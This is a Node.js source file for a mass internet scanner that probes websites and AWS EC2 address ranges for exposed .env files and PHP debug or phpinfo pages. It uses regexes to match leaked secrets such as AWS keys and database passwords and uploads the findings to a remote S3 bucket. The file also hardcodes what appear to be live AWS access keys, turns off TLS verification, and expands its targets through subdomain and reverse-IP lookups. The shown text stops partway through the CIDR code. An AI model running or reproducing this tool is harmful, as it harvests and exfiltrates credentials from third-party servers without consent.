/**
 * Scanner - Node.js port from start.py
 * Uses pack.json directly (no XOR encryption).
 * Build: pkg scanner.js --targets node18-linux-x64 -o scanner
 */
'use strict';

const https = require('https');
const http = require('http');
const crypto = require('crypto');
const zlib = require('zlib');
const fs = require('fs');
const path = require('path');
const os = require('os');
const dns = require('dns');
const { URL } = require('url');
const { Worker, isMainThread, parentPort, workerData, threadId } = require('worker_threads');

// ─── External deps ────────────────────────────────────────────
const axios = require('axios');
const cheerio = require('cheerio');

// ================================================================
// CONFIG — carica da pack.json
// ================================================================
const APP_DIR = __dirname;
const DATA_DIR = '/app';  // Volume persistente Bunny CDN
let packCfg = {};
try {
  packCfg = require(path.join(APP_DIR, 'pack.json'));
} catch (e) {
  console.error('[!] pack.json not found or invalid:', e.message);
  process.exit(1);
}

// Regex patterns & file lists from pack.json (replaces json.dat)
const patterns = packCfg.APP_REGEX_ENV_SHELL || [];
const file_envscan = [...new Set(packCfg.file_env_shellscan || [])];
const file_phpprofile = [...new Set(packCfg.file_phpprofile_shellscan || [])];

// --- Logging ---
const LOG_ACTIVE = false;
const LOG_UPLOAD_INTERVAL = 500 + Math.floor(Math.random() * 300); // 500-800

// --- Storage ---
const AWS_S3 = true;
const BUNNY_STORAGE = false;

// --- S3 Config ---
const S3_BUCKET = 'diablo-results-store';
const S3_FOLDER = 'diablo-results';
const S3_REGION = 'eu-north-1';
const S3_ACCESS_KEY = 'AKIAW3MEAPS545FBGS5I';
const S3_SECRET_KEY = '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';
const S3_HOST = `s3.${S3_REGION}.amazonaws.com`;

// --- Bunny Config ---
const BUNNY_STORAGE_URL = '';
const BUNNY_API_KEY = '';

// --- Fonti target ---
const LOAD_FROM_SITE = true;
const LOAD_FROM_CIDR = true;
const USE_REV = false;

// --- Performance ---
const MAX_SITE_BATCH = 10;
const MAX_LIST_ENV = 50;
const MAX_LIST_PHP = 50;
const DNS_WORKERS_EC2 = 100;
const DNS_TIMEOUT_EC2 = 3;
const MAX_IPS_PER_CIDR = 3;
const TOTAL_SLOTS = 2000;
const NUM_WORKERS = 1;

// CIDR filter
const MIN_CIDR_IPS = 1_000_000;

// ─── Derived constants ─────────────────────────────────────────
const RESULT_DIR = path.join(DATA_DIR, 'risultati');
const NEW_PATH_EXTRACT = path.join(RESULT_DIR, 'DATA_SPLIT');
const SITE_DIR = path.join(DATA_DIR, 'site');
const LOGS_DIR = path.join(DATA_DIR, 'logs');
const CONTAINER_NAME = process.env.HOSTNAME || `local_${Math.floor(Date.now() / 1000)}`;
const SLOT_HASH = parseInt(crypto.createHash('md5').update(CONTAINER_NAME).digest('hex').slice(0, 12), 16);
const INSTANCE_ID = SLOT_HASH % TOTAL_SLOTS;

let LOG_PATH = null;

// Axios instance (skip TLS verify)
const ax = axios.create({
  httpsAgent: new https.Agent({ rejectUnauthorized: false }),
  httpAgent: new http.Agent({}),
  timeout: 10000,
  maxRedirects: 0,
  validateStatus: () => true,
});

// ================================================================
// UTILITY
// ================================================================
const ts = () => new Date().toISOString().slice(11, 19);
const log = (...args) => console.log(`[${ts()}]`, ...args);
const randStr = (len) => crypto.randomBytes(Math.ceil(len / 2)).toString('hex').slice(0, len);
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

// Concurrency gate (replaces gevent Pool)
async function asyncPool(concurrency, items, fn) {
  const results = [];
  const executing = new Set();
  for (const item of items) {
    const p = Promise.resolve().then(() => fn(item));
    results.push(p);
    executing.add(p);
    const clean = () => executing.delete(p);
    p.then(clean, clean);
    if (executing.size >= concurrency) {
      await Promise.race(executing);
    }
  }
  return Promise.allSettled(results);
}

// Log tee (writes to file + stdout)
class TeeLogger {
  constructor(filepath) {
    this.logfile = fs.createWriteStream(filepath, { flags: 'a' });
  }
  write(msg) {
    process.stdout.write(msg);
    this.logfile.write(msg);
  }
}

// ================================================================
// AWS SIGV4 HELPERS
// ================================================================
function awsSign(key, msg) {
  return crypto.createHmac('sha256', key).update(msg).digest();
}

function awsSigV4Headers(bucket, s3key, payload) {
  const amzDate = new Date().toISOString().replace(/[:-]|\.\d{3}/g, '');
  const dateStamp = amzDate.slice(0, 8);
  const service = 's3';
  const algorithm = 'AWS4-HMAC-SHA256';

  const canonicalUri = '/' + s3key;
  const payloadHash = crypto.createHash('sha256').update(payload).digest('hex');

  const canonicalHeaders = [
    `host:${bucket}.${S3_HOST}`,
    `x-amz-content-sha256:${payloadHash}`,
    `x-amz-date:${amzDate}`,
  ].join('\n') + '\n';
  const signedHeaders = 'host;x-amz-content-sha256;x-amz-date';

  const canonicalRequest = [
    'PUT',
    canonicalUri,
    '',
    canonicalHeaders,
    signedHeaders,
    payloadHash,
  ].join('\n');

  const credentialScope = `${dateStamp}/${S3_REGION}/${service}/aws4_request`;
  const stringToSign = [
    algorithm,
    amzDate,
    credentialScope,
    crypto.createHash('sha256').update(canonicalRequest).digest('hex'),
  ].join('\n');

  const kDate = awsSign(Buffer.from('AWS4' + S3_SECRET_KEY), dateStamp);
  const kRegion = awsSign(kDate, S3_REGION);
  const kService = awsSign(kRegion, service);
  const kSigning = awsSign(kService, 'aws4_request');
  const signature = crypto.createHmac('sha256', kSigning).update(stringToSign).digest('hex');

  const auth = `${algorithm} Credential=${S3_ACCESS_KEY}/${credentialScope}, SignedHeaders=${signedHeaders}, Signature=${signature}`;

  return {
    'Host': `${bucket}.${S3_HOST}`,
    'x-amz-date': amzDate,
    'x-amz-content-sha256': payloadHash,
    'Authorization': auth,
    'Content-Type': 'application/octet-stream',
    'Content-Length': String(payload.byteLength),
  };
}

// ================================================================
// S3 INDEX APPEND (with optimistic locking)
// ================================================================
async function appendToS3Index(s3KeyFull) {
  const indexKey = `${S3_FOLDER}/index.txt`;
  const urlIdx = `https://${S3_BUCKET}.${S3_HOST}/${indexKey}`;

  for (let attempt = 0; attempt < 5; attempt++) {
    try {
      if (attempt === 0) await sleep(300 + Math.random() * 1200);

      const amzDate = new Date().toISOString().replace(/[:-]|\.\d{3}/g, '');
      const dateStamp = amzDate.slice(0, 8);
      const credentialScope = `${dateStamp}/${S3_REGION}/s3/aws4_request`;

      const canonicalHeadersGet = [
        `host:${S3_BUCKET}.${S3_HOST}`,
        `x-amz-content-sha256:UNSIGNED-PAYLOAD`,
        `x-amz-date:${amzDate}`,
      ].join('\n') + '\n';
      const signedHeadersGet = 'host;x-amz-content-sha256;x-amz-date';
      const canonicalRequestGet = [
        'GET',
        `/${indexKey}`,
        '',
        canonicalHeadersGet,
        signedHeadersGet,
        'UNSIGNED-PAYLOAD',
      ].join('\n');
      const stringToSignGet = [
        'AWS4-HMAC-SHA256',
        amzDate,
        credentialScope,
        crypto.createHash('sha256').update(canonicalRequestGet).digest('hex'),
      ].join('\n');

      const kDate = awsSign(Buffer.from('AWS4' + S3_SECRET_KEY), dateStamp);
      const kRegion = awsSign(kDate, S3_REGION);
      const kService = awsSign(kRegion, 's3');
      const kSigning = awsSign(kService, 'aws4_request');
      const sigGet = crypto.createHmac('sha256', kSigning).update(stringToSignGet).digest('hex');

      const getHeaders = {
        'Host': `${S3_BUCKET}.${S3_HOST}`,
        'x-amz-date': amzDate,
        'x-amz-content-sha256': 'UNSIGNED-PAYLOAD',
        'Authorization': `AWS4-HMAC-SHA256 Credential=${S3_ACCESS_KEY}/${credentialScope}, SignedHeaders=${signedHeadersGet}, Signature=${sigGet}`,
      };

      const resGet = await ax.get(urlIdx, { headers: getHeaders, timeout: 10000 });
      let existing = '';
      let currentEtag = null;

      if (resGet.status === 200) {
        existing = typeof resGet.data === 'string' ? resGet.data : '';
        currentEtag = (resGet.headers.etag || '').replace(/"/g, '');
      }

      const newContent = existing + s3KeyFull + '\n';
      const idxPayload = Buffer.from(newContent, 'utf8');

      const putHeaders = awsSigV4Headers(S3_BUCKET, indexKey, idxPayload);
      putHeaders['Content-Type'] = 'text/plain';
      if (currentEtag) putHeaders['If-Match'] = `"${currentEtag}"`;

      const resPut = await ax.put(urlIdx, { headers: putHeaders, data: idxPayload, timeout: 10000 });

      if ([200, 201].includes(resPut.status)) return;
      if (resPut.status === 412) { await sleep(500 * Math.pow(2, attempt)); continue; }
      await sleep(1000);
    } catch (e) {
      await sleep(1000);
    }
  }
}

// ================================================================
// S3 UPLOAD
// ================================================================
async function uploadFileToS3(localPath, remotePath, maxRetries = 3) {
  if (!AWS_S3) return false;
  const s3key = `${S3_FOLDER}/${remotePath}`;
  let lastError = null;

  for (let attempt = 0; attempt < maxRetries; attempt++) {
    try {
      log(`[S3 UPLOAD] ${localPath} -> s3://${S3_BUCKET}/${s3key} (${attempt + 1}/${maxRetries})`);
      const payload = await fs.promises.readFile(localPath);
      const headers = awsSigV4Headers(S3_BUCKET, s3key, payload);
      const url = `https://${S3_BUCKET}.${S3_HOST}/${s3key}`;
      const res = await ax.put(url, { headers, data: payload, timeout: 30000 });

      if ([200, 201].includes(res.status)) {
        log(`[S3 UPLOAD] OK: s3://${S3_BUCKET}/${s3key}`);
        appendToS3Index(s3key).catch(() => {});
        return true;
      }
      if (res.status === 429) {
        const wait = Math.pow(2, attempt);
        log(`[S3 UPLOAD] Rate limited (429), retry in ${wait}s`);
        await sleep(wait * 1000);
        lastError = '429 Rate Limited';
      } else if (res.status >= 500) {
        const wait = Math.pow(2, attempt);
        log(`[S3 UPLOAD] Server error ${res.status}, retry in ${wait}s`);
        await sleep(wait * 1000);
        lastError = `Status ${res.status}`;
      } else {
        log(`[S3 UPLOAD] Error ${s3key}: Status ${res.status}`);
        return false;
      }
    } catch (e) {
      lastError = e.message;
      if (attempt < maxRetries - 1) {
        const wait = Math.pow(2, attempt);
        log(`[S3 UPLOAD] Exception ${s3key}: ${e.message}, retry in ${wait}s`);
        await sleep(wait * 1000);
      } else {
        log(`[S3 UPLOAD] FAILED ${s3key}: ${e.message}`);
      }
    }
  }
  if (lastError) {
    try {
      await fs.promises.appendFile(path.join(RESULT_DIR, 'err.log'), `Error S3 (${s3key}): ${lastError}\n`);
    } catch (_) {}
  }
  return false;
}

async function uploadLogToS3() {
  if (!LOG_ACTIVE || !LOG_PATH) return;
  try { await fs.promises.access(LOG_PATH); } catch (_) { return; }
  const remote = `logs/${path.basename(LOG_PATH)}`;
  uploadFileToS3(LOG_PATH, remote, 1).catch(() => {});
}

// ================================================================
// BUNNY UPLOAD
// ================================================================
async function uploadFileToBunny(localPath, remotePath, maxRetries = 3) {
  if (!BUNNY_STORAGE) return false;
  const headers = { 'AccessKey': BUNNY_API_KEY };
  const url = `${BUNNY_STORAGE_URL}/${remotePath}`;

  for (let attempt = 0; attempt < maxRetries; attempt++) {
    try {
      log(`[BUNNY UPLOAD] ${localPath} -> ${remotePath} (${attempt + 1}/${maxRetries})`);
      const data = await fs.promises.readFile(localPath);
      const res = await ax.put(url, { headers, data, timeout: 30000 });

      if ([200, 201].includes(res.status)) {
        log(`[BUNNY UPLOAD] OK: ${remotePath}`);
        return true;
      }
      if (res.status === 429) {
        await sleep(Math.pow(2, attempt) * 1000);
      } else if (res.status >= 500) {
        await sleep(Math.pow(2, attempt) * 1000);
      } else {
        log(`[BUNNY UPLOAD] Error ${remotePath}: Status ${res.status}`);
        return false;
      }
    } catch (e) {
      if (attempt < maxRetries - 1) {
        await sleep(Math.pow(2, attempt) * 1000);
      } else {
        log(`[BUNNY UPLOAD] FAILED ${remotePath}: ${e.message}`);
      }
    }
  }
  return false;
}

async function uploadLogToBunny() {
  if (!LOG_ACTIVE || !LOG_PATH) return;
  try { await fs.promises.access(LOG_PATH); } catch (_) { return; }
  const remote = `logs/${path.basename(LOG_PATH)}`;
  uploadFileToBunny(LOG_PATH, remote, 1).catch(() => {});
}

// ================================================================
// UPLOAD DISPATCH
// ================================================================
async function uploadFile(localPath, remotePath, maxRetries = 3) {
  let ok = false;
  if (AWS_S3) {
    if (await uploadFileToS3(localPath, remotePath, maxRetries)) ok = true;
  }
  if (BUNNY_STORAGE) {
    if (await uploadFileToBunny(localPath, remotePath, maxRetries)) ok = true;
  }
  return ok;
}

async function uploadLog() {
  if (!LOG_ACTIVE || !LOG_PATH) return;
  try { await fs.promises.access(LOG_PATH); } catch (_) { return; }
  if (AWS_S3) uploadLogToS3().catch(() => {});
  if (BUNNY_STORAGE) uploadLogToBunny().catch(() => {});
}

// ================================================================
// URL HELPERS
// ================================================================
const DEFAULT_HEADERS = {
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'Accept-Language': 'it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7',
  'Connection': 'keep-alive',
};

function* generateEnvBatches(siteLink) {
  const base = siteLink.replace(/\/+$/, '');
  for (let i = 0; i < file_envscan.length; i += MAX_LIST_ENV) {
    yield file_envscan.slice(i, i + MAX_LIST_ENV).map(p => `${base}/${p.replace(/^\//, '')}`);
  }
}

function* generatePhpBatches(siteLink) {
  const base = siteLink.replace(/\/+$/, '');
  for (let i = 0; i < file_phpprofile.length; i += MAX_LIST_PHP) {
    yield file_phpprofile.slice(i, i + MAX_LIST_PHP).map(p => `${base}/${p.replace(/^\//, '')}`);
  }
}

function getInitialUrl(url) {
  if (url.startsWith('http://') || url.startsWith('https://')) return url;
  if (url.endsWith(':443')) return `https://${url}`;
  if (url.endsWith(':80')) return `http://${url}`;
  return `http://${url}`;
}

function getRetryUrl(url) {
  if (url.startsWith('http://')) return url.replace('http://', 'https://');
  if (url.startsWith('https://')) return url.replace('https://', 'http://');
  if (url.endsWith(':443') || url.endsWith(':80')) return null;
  return `https://${url}`;
}

// ================================================================
// SUBDOMAIN FINDER
// ================================================================
function cleanSubdomain(sub, domain) {
  sub = sub.trim().toLowerCase();
  sub = sub.replace(/^https?:\/\//, '');
  sub = sub.split(':')[0];
  if (sub.startsWith('*.')) sub = sub.slice(2);
  if (sub.endsWith('.')) sub = sub.slice(0, -1);
  return sub;
}

async function findSubdomains(domain) {
  const sources = [
    { name: 'ht', url: `https://api.hackertarget.com/hostsearch/?q=${domain}`, timeout: 10000 },
    { name: 'otx', url: `https://otx.alienvault.com/api/v1/indicators/domain/${domain}/passive_dns`, timeout: 10000 },
    { name: 'crt', url: `https://crt.sh/?q=%.${domain}&output=json`, timeout: 15000 },
  ];

  const results = await Promise.allSettled(sources.map(s => ax.get(s.url, { timeout: s.timeout })));
  const subdomains = new Set();

  for (let i = 0; i < sources.length; i++) {
    const r = results[i];
    if (r.status !== 'fulfilled' || !r.value || r.value.status !== 200) continue;
    const res = r.value;
    const source = sources[i].name;

    try {
      if (source === 'ht') {
        const text = typeof res.data === 'string' ? res.data : '';
        if (!text.toLowerCase().includes('error')) {
          for (const line of text.trim().split('\n')) {
            const sub = cleanSubdomain(line.split(',')[0], domain);
            if (sub.endsWith(domain) && sub !== domain) subdomains.add(sub);
          }
        }
      } else if (source === 'otx') {
        const data = res.data;
        for (const entry of (data.passive_dns || [])) {
          const sub = cleanSubdomain(entry.hostname || '', domain);
          if (sub.endsWith(domain) && sub !== domain) subdomains.add(sub);
        }
      } else if (source === 'crt') {
        const data = res.data;
        for (const entry of data) {
          const name = entry.name_value || '';
          for (let cn of name.split('\n')) {
            cn = cleanSubdomain(cn, domain);
            if (cn.endsWith(domain) && cn !== domain) subdomains.add(cn);
          }
        }
      }
    } catch (_) {}
  }

  if (subdomains.size === 0) return null;
  return [...subdomains].sort().map(s => s.startsWith('www.') ? s.slice(4) : s);
}

// ================================================================
// REVERSE IP LOOKUP
// ================================================================
async function reverseIpLookup(ip) {
  try {
    const res = await ax.get(`https://api.hackertarget.com/reverseiplookup/?q=${ip}`, { timeout: 15000 });
    if (res.status !== 200) return null;
    const result = (typeof res.data === 'string' ? res.data : res.data.toString()).trim();
    if (!result || result.includes('No DNS A records found') || result.includes('API count exceeded') || result.toLowerCase().includes('error')) return null;
    return result.split('\n').map(d => {
      d = d.trim();
      if (!d) return null;
      if (d.startsWith('www.')) d = d.slice(4);
      return d;
    }).filter(Boolean);
  } catch (_) { return null; }
}

// ================================================================
// SITE FILE LOADER
// ================================================================
async function loadSitesFromFolder() {
  if (!LOAD_FROM_SITE) return { targets: [], filepath: null };

  try { await fs.promises.access(SITE_DIR); } catch (_) {
    log(`[SITE] Folder '${SITE_DIR}' not found. Create it and put .txt files with targets.`);
    return { targets: [], filepath: null };
  }

  const files = (await fs.promises.readdir(SITE_DIR))
    .filter(f => f.endsWith('.txt'))
    .sort();

  if (files.length === 0) return { targets: [], filepath: null };

  const filename = files[0];
  const filepath = path.join(SITE_DIR, filename);
  let targets = [];

  try {
    const content = await fs.promises.readFile(filepath, 'utf8');
    for (let line of content.split('\n')) {
      line = line.trim();
      if (line && !line.startsWith('#')) {
        if (!line.startsWith('http')) line = getInitialUrl(line);
        targets.push(line);
      }
    }
  } catch (e) {
    log(`[SITE] Error reading ${filename}: ${e.message}`);
    return { targets: [], filepath };
  }

  log(`[SITE] ${filename}: ${targets.length} targets loaded`);
  return { targets, filepath };
}

async function deleteSiteFile(filepath) {
  try {
    await fs.promises.unlink(filepath);
    log(`[SITE] ${path.basename(filepath)} DELETED`);
  } catch (e) {
    log(`[SITE] (!) Cannot delete ${path.basename(filepath)}: ${e.message}`);
  }
}

// ================================================================
// SCAN ENGINE — _scan_site ported to JS
// ================================================================
function buildRegexPattern(pattern) {
  const specials = /[.^$*+?{}[\]\\|()]/;
  if (specials.test(pattern)) return new RegExp(pattern, 'i'); // already regex
  const escaped = pattern.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  const startB = /^[a-zA-Z0-9_]/.test(pattern) ? '\\b' : '';
  const endB = /[a-zA-Z0-9_]$/.test(pattern) ? '\\b' : '';
  return new RegExp(`${startB}${escaped}${endB}`, 'i');
}

// Pre-build all patterns
const compiledPatterns = patterns.map(p => buildRegexPattern(p));

async function scanSite(siteLink, isFallback = false) {
  try {
    log(`  [LOOK] Starting scan ${siteLink}`);

    let checked = 0;
    let checkeds = 0;
    let wildcardStrikeCount = 0;
    let fakeForSite = false;
    let foundForSite = false;
    const seenContentHashes = new Set();

    // ── Phase 1: ENV Scouting ──────────────────────────────
    const envBatches = [...generateEnvBatches(siteLink)];
    for (const batch of envBatches) {
      if (fakeForSite || foundForSite) break;

      const results = await Promise.allSettled(batch.map(url =>
        ax.get(url, {
          headers: { ...DEFAULT_HEADERS, 'Range': 'bytes=0-4096' },
          timeout: 6000,
          responseType: 'text',
          transformResponse: [(data) => data],
        })
      ));

      for (const r of results) {
        if (fakeForSite || foundForSite) break;
        if (r.status !== 'fulfilled' || !r.value) continue;
        const res = r.value;
        if (![200, 206].includes(res.status)) continue;

        checked++;
        let content = typeof res.data === 'string' ? res.data : '';
        const contentLower = content.toLowerCase();

        // HTML skip
        const head = contentLower.slice(0, 200);
        if (head.includes('<html') || head.includes('<!doctype') || head.includes('<body')) {
          log(`  [!] HTML skip | ${res.config.url}`);
          continue;
        }

        // False positive checks
        if (contentLower.includes('<pre') && contentLower.includes('</pre')) {
          fakeForSite = true;
          log(`  [!] Skip on ${siteLink} - NOPE (PRE tag)`);
          break;
        }
        if (contentLower.includes('popbox.fun')) {
          fakeForSite = true;
          log(`  [!] Skip on ${siteLink} - NOPE (popbox)`);
          break;
        }

        // Regex check
        for (const regex of compiledPatterns) {
          if (regex.test(content)) {
            foundForSite = true;
            break;
          }
        }

        if (foundForSite) {
          log(`  [+] Found | ${res.config.url}`);
          const suffix = randStr(10);
          const savedPath = path.join(NEW_PATH_EXTRACT, `ENV_NEW_${suffix}.txt`);
          await fs.promises.writeFile(savedPath, `${res.config.url}\n${content}`);
          const remote = `risultati/DATA_SPLIT/ENV_NEW_${suffix}.txt`;
          uploadFile(savedPath, remote).catch(() => {});
          break;
        }
      }

      // Catch-all: >=10 .env files return 200 -> flood site
      if (checked >= 10 && !foundForSite) {
        fakeForSite = true;
        log(`  [!] DUPE ENV (${checked}+ links) on ${siteLink} - NOPE`);
        break;
      }
    }

    if (fakeForSite) {
      log(`  [OK] STOP NOPE ${siteLink} — ${checked} links (DUPE/flood)`);
      return;
    }

    if (foundForSite) {
      log(`  [OK] STOP FOUND ${siteLink} — ${checked} links`);
      await doReverseAndSubdomains(siteLink, isFallback);
      return;
    }

    // ── Phase 2: PHP Scouting (POST) ────────────────────────
    const phpBatches = [...generatePhpBatches(siteLink)];
    for (const batch of phpBatches) {
      if (fakeForSite || foundForSite) break;

      const results = await Promise.allSettled(batch.map(url =>
        ax.post(url, '0x01[]=x', {
          headers: { ...DEFAULT_HEADERS, 'Range': 'bytes=0-4096', 'Content-Type': 'application/x-www-form-urlencoded' },
          timeout: 6000,
          responseType: 'arraybuffer',
        })
      ));

      const uniqueResponses = new Map();
      const findFileRequests = [];

      for (const r of results) {
        if (fakeForSite || foundForSite) break;
        if (r.status !== 'fulfilled' || !r.value) continue;
        const res = r.value;
        if (![200, 206].includes(res.status)) continue;

        checkeds++;
        const requestUrl = res.config.url;

        if (!uniqueResponses.has(requestUrl)) {
          const content = Buffer.isBuffer(res.data) ? res.data : Buffer.from(res.data || '');
          const contentLen = content.length;

          if (contentLen < 10 || contentLen > 1000000) continue;

          const head = content.slice(0, 200).toString('utf8').toLowerCase();
          const isHtmlDoc = head.includes('<html') || head.includes('<!doctype');
          let isDebugPage = false;

          if (isHtmlDoc) {
            const contentStrHead = content.slice(0, 5000).toString('utf8').toLowerCase();
            const debugKeywords = [
              'phpinfo()', 'php version', 'zend extension', 'php license',
              'sf-toolbar', 'symfony profiler', 'php-debugbar',
              'whoops! there was an error', 'stack trace',
              'aws_access_key_id', 'db_password', 'db_host', 'aws_secret',
            ];
            if (debugKeywords.some(k => contentStrHead.includes(k))) isDebugPage = true;
          }

          if (isHtmlDoc && !isDebugPage) continue;

          const contentHash = crypto.createHash('md5').update(content).digest('hex');
          if (seenContentHashes.has(contentHash)) {
            wildcardStrikeCount++;
            if (wildcardStrikeCount >= 5) {
              fakeForSite = true;
              log(`  [!] DUP (5 duplicates) on ${siteLink} - NOPE`);
              break;
            }
            continue;
          }
          seenContentHashes.add(contentHash);
          uniqueResponses.set(requestUrl, { url: requestUrl, content, isDebugPage, isHtmlDoc });
          findFileRequests.push({ url: requestUrl, content, isDebugPage, isHtmlDoc });
        }
      }

      // Catch-all PHP
      if (checkeds >= 10 && !foundForSite) {
        fakeForSite = true;
        log(`  [!] DUPE PHP (${checkeds}+ links) on ${siteLink} - NOPE`);
        break;
      }

      // Deep extraction
      if (uniqueResponses.size > 0) {
        log(`  [DEEP] ${uniqueResponses.size} valid targets, regex extraction on ${siteLink}`);

        for (const item of findFileRequests) {
          if (!item) continue;
          const contentsx = item.content.toString('utf8');

          // Regex match
          for (const regex of compiledPatterns) {
            if (regex.test(contentsx)) {
              foundForSite = true;
              break;
            }
          }

          if (foundForSite) {
            log(`  [+] Found | ${item.url}`);

            // PHPINFO extraction
            if (item.isDebugPage || contentsx.toLowerCase().includes('phpinfo')) {
              try {
                const $ = cheerio.load(contentsx);
                const h2 = $('h2').filter((_, el) => $(el).text() === 'PHP Variables');
                if (h2.length > 0) {
                  const table = h2.next('table');
                  if (table.length > 0) {
                    let formattedOutput = '';
                    table.find('tr').each((_, row) => {
                      const cols = $(row).find('td');
                      if (cols.length >= 2) {
                        const varName = $(cols[0]).text().trim();
                        const varValue = $(cols[1]).text().trim();
                        const match = varName.match(/\['([^']+)'\]/);
                        if (match) {
                          formattedOutput += `${match[1]} \t ${varValue}\n`;
                        }
                      }
                    });
                    if (formattedOutput) {
                      log(`  [+] PHPINFO FOUND | ${item.url}`);
                      const suffix = randStr(10);
                      const savedPath = path.join(NEW_PATH_EXTRACT, `PHPINFO_${suffix}.txt`);
                      await fs.promises.writeFile(savedPath, `${item.url}\n${formattedOutput}`);
                      const remote = `risultati/DATA_SPLIT/PHPINFO_${suffix}.txt`;
                      uploadFile(savedPath, remote).catch(() => {});
                    }
                  }
                }
              } catch (_) {}
            }
            break;
          }
        }
      }

      if (fakeForSite || foundForSite) break;
    }

    // ── Summary ─────────────────────────────────────────────
    const totalTested = checked + checkeds;
    if (fakeForSite) {
      log(`  [OK] STOP NOPE ${siteLink} — ${totalTested} links (DUPE)`);
    } else if (foundForSite) {
      log(`  [OK] STOP FOUND ${siteLink} — ${totalTested} links`);
      await doReverseAndSubdomains(siteLink, isFallback);
    } else {
      log(`  [OK] STOP NONE ${siteLink} — ${totalTested} links`);
    }
  } catch (e) {
    try {
      await fs.promises.appendFile(path.join(RESULT_DIR, 'err.log'), e.message + '\n');
    } catch (_) {}
  }
}

// ================================================================
// URL PROCESSOR
// ================================================================
async function processUrls(urlsList, isFallback = false) {
  log(`\n[CHK] Starting scan on ${urlsList.length} URLs (fallback=${isFallback})`);

  for (let i = 0; i < urlsList.length; i += 100) {
    const chunk = urlsList.slice(i, i + 100);
    log(`[CHK] Checking block of ${chunk.length} URLs...`);

    // First pass
    const results = await Promise.allSettled(chunk.map(url =>
      ax.get(getInitialUrl(url), { timeout: 3000, responseType: 'stream' })
    ));

    const hostsBySite = {};
    for (const r of results) {
      if (r.status !== 'fulfilled' || !r.value) continue;
      const res = r.value;
      if ([200, 403, 206].includes(res.status)) {
        const siteUrl = getInitialUrl(r.value.config.url);
        if (!hostsBySite[siteUrl]) {
          hostsBySite[siteUrl] = {
            env: [...generateEnvBatches(siteUrl)],
            php: [...generatePhpBatches(siteUrl)],
          };
        }
      }
    }

    // Retry HTTPS for failed URLs
    const retryUrls = [];
    for (let j = 0; j < results.length; j++) {
      const r = results[j];
      if (r.status !== 'fulfilled' || !r.value || ![200, 403, 206].includes(r.value.status)) {
        const retryU = getRetryUrl(chunk[j]);
        if (retryU) retryUrls.push(retryU);
      }
    }

    if (retryUrls.length > 0) {
      log(`[CHK] Retrying ${retryUrls.length} URLs in HTTPS...`);
      const retryResults = await Promise.allSettled(retryUrls.map(url =>
        ax.get(url, { timeout: 3000, responseType: 'stream' })
      ));
      for (const r of retryResults) {
        if (r.status !== 'fulfilled' || !r.value) continue;
        const res = r.value;
        if ([200, 403, 206].includes(res.status)) {
          const siteUrl = getInitialUrl(res.config.url);
          if (!hostsBySite[siteUrl]) {
            hostsBySite[siteUrl] = {
              env: [...generateEnvBatches(siteUrl)],
              php: [...generatePhpBatches(siteUrl)],
            };
          }
        }
      }
    }

    // Scan in batches
    const siteList = Object.entries(hostsBySite);
    for (let batchIdx = 0; batchIdx < siteList.length; batchIdx += MAX_SITE_BATCH) {
      const chunkSites = siteList.slice(batchIdx, batchIdx + MAX_SITE_BATCH);
      await Promise.all(chunkSites.map(([siteUrl, payloads]) =>
        scanSite(siteUrl, isFallback)
      ));
      const bn = Math.floor(batchIdx / MAX_SITE_BATCH) + 1;
      const totalBatches = Math.ceil(siteList.length / MAX_SITE_BATCH);
      log(`  [CHK] Batch ${bn}/${totalBatches} completed`);
    }
  }
}

// ================================================================
// REVERSE IP + SUBDOMAINS
// ================================================================
async function doReverseAndSubdomains(siteLink, isFallback) {
  if (!USE_REV || isFallback) return;

  let hostxxx;
  try { hostxxx = new URL(siteLink).hostname; } catch (_) { return; }
  if (!hostxxx) return;
  if (hostxxx.startsWith('www.')) hostxxx = hostxxx.slice(4);

  // Check if IP
  const ipRegex = /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/;
  const isIp = ipRegex.test(hostxxx);

  if (isIp) {
    const domains = await reverseIpLookup(hostxxx);
    if (domains && domains.length > 0) {
      const filtered = domains.filter(d => d.toLowerCase().replace(/\/+$/, '') !== hostxxx.toLowerCase());
      if (filtered.length > 0) {
        log(`  [REV] IP ${hostxxx} — found ${filtered.length} domains`);
        for (const d of filtered) log(`    [REV] => ${d}`);
        await processUrls(filtered, true);
      } else {
        log(`  [REV] IP ${hostxxx} — filtered (all self-referential)`);
      }
    } else {
      log(`  [REV] IP ${hostxxx} — no domains found`);
    }
  } else {
    // Domain: subdomains first
    const parts = hostxxx.split('.');
    const targetDomain = parts.length > 2 ? parts.slice(-2).join('.') : hostxxx;
    log(`  [REV] Searching subdomains for ${targetDomain}...`);
    let domains = await findSubdomains(targetDomain);
    if (domains && domains.length > 0) {
      domains = domains.filter(d => d.toLowerCase().replace(/\/+$/, '') !== hostxxx.toLowerCase());
      if (domains.length > 0) {
        log(`  [REV] Domain ${targetDomain} — found ${domains.length} subdomains`);
        for (const d of domains) log(`    [REV] => ${d}`);
        await processUrls(domains, true);
      }
    } else {
      // Fallback: reverse DNS
      log(`  [REV] No subdomains, trying reverse IP for ${hostxxx}...`);
      try {
        const addresses = await dns.promises.resolve4(hostxxx);
        if (addresses.length > 0) {
          const targetIp = addresses[0];
          let revDomains = await reverseIpLookup(targetIp);
          if (revDomains && revDomains.length > 0) {
            revDomains = revDomains.filter(d => d.toLowerCase().replace(/\/+$/, '') !== hostxxx.toLowerCase());
            if (revDomains.length > 0) {
              log(`  [REV] IP ${targetIp} — found ${revDomains.length} domains`);
              for (const d of revDomains) log(`    [REV] => ${d}`);
              await processUrls(revDomains, true);
            }
          }
        }
      } catch (e) {
        log(`  [REV] DNS failed for ${hostxxx}: ${e.message}`);
      }
    }
  }
}

// ================================================================
// AWS CIDR SCANNER
// ================================================================
async function fetchAwsIps() {
  log('[AWS FETCH] Downloading AWS IP ranges...');
  const res = await ax.get('https://ip-ranges.amazonaws.com/ip-ranges.json', { timeout: 30000 });
  if (res.status !== 200) throw new Error(`AWS IP fetch failed: ${res.status}`);
  return res.data;
}

function getEc2Cidrs(data) {
  return (data.prefixes || [])
    .filter(p => p.service === 'EC2')
    .map(p => ({ cidr: p.ip_prefix, region: p.region }));
}

function buildCidrPool(cidrs) {
  const sources = [];
  let skipped = 0;
  for (const { cidr, region } of cidrs) {
    try {
      const parts = cidr.split('/');
      const ip = parts[0];
      const prefix = parseInt(parts[1]);
